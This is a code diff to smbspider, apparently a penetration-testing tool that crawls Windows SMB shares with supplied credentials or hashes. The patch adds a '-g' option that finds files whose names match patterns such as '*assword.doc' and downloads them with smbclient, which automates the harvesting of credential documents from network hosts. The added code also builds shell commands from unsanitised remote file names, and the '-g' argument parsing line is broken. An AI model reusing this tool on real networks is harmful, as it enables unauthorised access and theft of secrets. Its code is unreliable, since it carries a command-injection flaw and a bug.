@@ -54,7 +54,9 @@ def help():
 	print colors.green + "\n Other (optional):\n" + colors.norm
 	print "\t -w \t\t Avoid verbose output. Output successful spider results to smbspider_host_share_user.txt."
 	print "\t\t\t This option is HIGHLY recommended if numerous systems are being scanned."
-	print "\t -n \t\t Ignore authentication check prior to spidering."
+	print "\t -n \t\t ** Ignore authentication check prior to spidering."
+	print "\t -g \t\t Grab (download) files that match strings provided in text file. (Case sensitive.)"
+	print "\t\t\t ** Examples: *assword.doc, *assw*.doc, pass*.xls, etc."
 	print colors.norm
 	exit()
 
@@ -62,11 +64,12 @@ def start(argv):
 	if len(argv) < 1:
 		help()
 	try:
-		opts, args = getopt.getopt(argv, "u:p:d:h:s:f:P:wn")
+		opts, args = getopt.getopt(argv, "u:p:d:h:s:f:P:wng:")
 	except getopt.GetoptError, err:
 		print colors.red + "\n  [-] Error: " + str(err) + colors.norm
 	
 	# set default variables to prevent errors later in script
+	sensitive_strings = []
 	smb_user = ""
 	smb_pass = ""
 	smb_domain = ""
@@ -109,6 +112,8 @@ def start(argv):
 			output = True
 		elif opt == "-n":
 			ignorecheck = True
+		elif opt == "-g":
+			sensitive_strings = open(arg.read().split("\n"))
 
 	#check options before proceeding
 	if (not smb_user or not smb_pass or not smb_host):
@@ -142,11 +147,11 @@ def start(argv):
 	print banner
 	unique_systems = [i for i in unique_systems if i != ''] #remove blank elements from list
 	print " [*] Spidering %s system(s)..." % len(unique_systems)
-	begin = spider(credentials, smb_host, smb_share, pth, output, ignorecheck, inputfile)
+	begin = spider(credentials, smb_host, smb_share, pth, output, ignorecheck, inputfile, sensitive_strings)
 	begin.start_spidering()
 
 class spider:
-	def __init__(self, credentials, hosts, shares, pth, output, ignorecheck, inputfile):
+	def __init__(self, credentials, hosts, shares, pth, output, ignorecheck, inputfile, sensitive_strings):
 		self.list_of_hosts = hosts
 		self.list_of_shares = shares
 		self.credentials = credentials
@@ -158,6 +163,9 @@ class spider:
 		self.blacklisted = []
 		self.ignorecheck = ignorecheck
 		self.inputfile = inputfile
+		self.smb_download = True
+		self.file_locations = []
+		self.sensitive_strings = sensitive_strings
 	
 	def start_spidering(self):
 		share = ""
@@ -218,6 +226,40 @@ class spider:
 					print " [*] Finished with smb://%s/<user profiles>. [Remaining: %s] " % (self.smb_host, str(len(self.list_of_hosts)-self.total_hosts))
 			else:
 				print " [*] Finished with smb://%s/%s. [Remaining: %s] " % (self.smb_host, self.smb_share, str(len(self.list_of_hosts)-self.total_hosts))
+		if self.smb_download: self.start_downloading()
+	
+	def start_downloading(self):
+		if len(self.sensitive_strings) == 0: return
+		print "\n [*] Attempting to download files that were deemed sensitive."
+		if not os.path.exists('smbspider-downloads'):
+			os.makedirs('smbspider-downloads')
+		for f in self.file_locations:
+			host = f[2:]
+			host = str(host[:host.find("\\")])
+			share = f[len(host)+3:]
+			share = share[:share.find("\\")]
+			full_path = f.replace("\\\\%s\\%s\\" % (self.smb_host, self.smb_share), "")
+			file_name = full_path[full_path.rfind("\\")+1:]
+			for s in self.sensitive_strings:
+				if s in full_path:
+					result = commands.getoutput("%s -c \"get \"%s\" %s\" //%s/%s -U %s " %  (self.smbclient(), full_path.replace("\\","\\\\"), \
+					file_name, host, share, self.credentials))
+					print colors.blue + " [*] " + colors.norm + "Downloaded: %s from smb://%s/%s" % (file_name, host, share)
+					commands.getoutput("mv %s smbspider-downloads" % file_name)
+				else:
+					temp_file =  s.split("*")
+					all_match = 0
+					for tmp in temp_file:
+						if tmp in full_path:
+							all_match = 1
+						else:
+							all_match = 0
+							break
+					if all_match == 1:
+						result = commands.getoutput("%s -c \"get \"%s\" %s\" //%s/%s -U %s " %  (self.smbclient(), full_path.replace("\\","\\\\"), \
+						file_name, host, share, self.credentials))
+						print colors.blue + " [*] " + colors.norm + "Downloaded: %s from smb://%s/%s" % (file_name, host, share)
+						commands.getoutput("mv %s smbspider-downloads" % file_name)
 		
 	def parse_result(self, result):
 		############################################################
@@ -241,13 +283,18 @@ class spider:
 		############################################################
 		directory = ""
 		filename = ""
+		file_locations = []
+		file_change = False
 		for x in result:
 			if x[0] == "\\":
 				directory = x
+				file_change = False
 			else:
 				filename = x[2:]
 				filename = filename[:filename.find("    ")]
+				file_change = True
 			fail = 0
+			if not file_change: continue
 			for error in errors:
 				if error in filename:
 					fail = 1
@@ -262,6 +309,8 @@ class spider:
 					file_complete_path = colors.blue + " [*] " + colors.norm + "\\\\%s\%s" % (self.smb_host,self.smb_share) + directory + "\\" + filename + "\n"
 					output.write(file_complete_path)
 					output.close()
+				if self.smb_download:
+					self.file_locations.append(file_complete_path[file_complete_path.find("\\\\"):])
 
 	def fingerprint_fs(self):
 		result = commands.getoutput("%s -c \"ls Users\\*\" //%s/C$ -U %s" % (self.smbclient(), self.smb_host, self.credentials)).split()
